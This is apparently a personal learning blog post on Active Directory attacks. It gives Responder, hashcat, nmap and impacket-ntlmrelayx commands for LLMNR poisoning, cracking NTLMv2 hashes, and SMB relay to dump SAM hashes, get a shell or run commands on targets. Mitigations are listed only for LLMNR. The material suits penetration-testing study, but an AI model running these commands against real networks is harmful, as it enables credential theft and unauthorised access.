---
title: Active Directory Attacks
date: 2023-10-18
categories: [Learning, Active Directory]
tags: [Active Directory, AD]
author: barabulkit
---

# LLMNR Poisoning (Responder)

## Attack

```shell
responder -I eth0 -wdv
```

![responder_hash](/assets/img/acd/responder_hash.png)

then we can crack the hash with hashcat

```shell
hashcat -m 5600 hash.txt rockyou.txt -O
```
5600 stands for module to crack NTLM2 hashes\

and will get cracked password
![cracked](/assets/img/acd/cracked.png)

## Mitigation

 - Disable LLMNR (in `Group Policy Editor` Local Computer Policy - Computer Configureation - Administrative Templates - Network - DNS Client - `Turn off Multicast name resolution`)
 - Disable NBT-NS (Network Connections - Network Adapter Properties = TCP/IPv4 Properties - Advanced tab - Wins tab - `Disable NetBIOS over TCP/IP`)

# SMB Relay

Instead of cracking hashes gathered with `Responder`, we can relay them to specific machines and potentially gain access

## Requirments

 - SMB signing disabled on target
 - Relayed user creds must be admin on machine

## Attack

First step is to identify targets without SMB signing

```shell
nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24
```

![smb_signing](/assets/img/acd/smb_signing.png)

Then we need to turn off smb and http servers in responder
```shell
vim /usr/share/responder/Responder.conf
```
![turnoff](/assets/img/acd/turnoff_smb_http.png)

And then we launch responder and relayx again

There are ips of machines with `not required smb signing` in targets.txt, that we discovered with nmap on previous step
```shell
responder -I eth0 -wdv
impacket-ntlmrelayx -tf targets.txt -smb2support
```

and after receiveng connection we will get SAM hashes
![hashes](/assets/img/acd/hashes.png)

we can also use 
```
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```
to get interactive shell, or
```
impacket-ntlmrelayx -tf targets.txt -smb2support -e test.exe
``` 
to execute test.exe on target machine, or
```
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```
to execute windows cmd command, or powershell oneliner with reverse tcp.